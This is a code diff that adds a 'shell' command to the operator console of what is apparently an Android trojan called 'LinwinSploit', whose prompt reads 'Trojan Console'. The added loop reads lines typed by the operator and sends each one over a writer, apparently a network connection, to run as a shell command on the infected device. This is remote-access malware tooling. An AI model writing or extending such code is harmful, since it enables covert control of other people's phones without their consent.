@@ -74,6 +74,24 @@ public class Main {
                         System.out.println(getFileContent("Help.txt"));
                     	System.out.print(terminal);
 		    }
+		    if (command.equals("shell")) {
+			Scanner s = new Scanner(System.in);
+		    	terminal = "LinwinSploit (Android) [Shell] $ ";
+			System.out.println("\n Enter 'exit' to exit from shell console.");
+			System.out.print(terminal);
+			while (true) {
+				System.out.print(terminal);
+				String c = s.nextLine();
+				if (c.equals("exit")) {
+					terminal = "LinwinSploit (Android) [Trojan Console] $ ";
+					break;
+				}
+
+				Main.printWriter.println("shell "+c);
+				Main.printWriter.flush();
+			}
+			System.out.print(terminal);
+		    }
 
                     else {
                         printWriter.println(command);
